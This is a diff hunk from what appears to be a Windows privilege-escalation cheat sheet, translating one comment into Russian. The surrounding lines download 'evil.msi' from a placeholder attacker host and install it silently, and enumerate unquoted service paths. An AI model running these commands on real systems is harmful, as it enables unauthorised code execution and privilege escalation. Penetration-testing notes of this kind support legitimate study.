@@ -107,7 +107,7 @@ Invoke-WebRequest -Uri "http://<IP>/evil.msi" -OutFile $msi
 Start-Process msiexec.exe -ArgumentList "/quiet /qn /i $msi" -Wait
 ```
 
-Find unquoted service paths with spaces — each space is a potential insertion point
+Поиск путей служб без кавычек, содержащих пробелы, — каждый пробел является потенциальной точкой внедрения
 
 ```
 wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
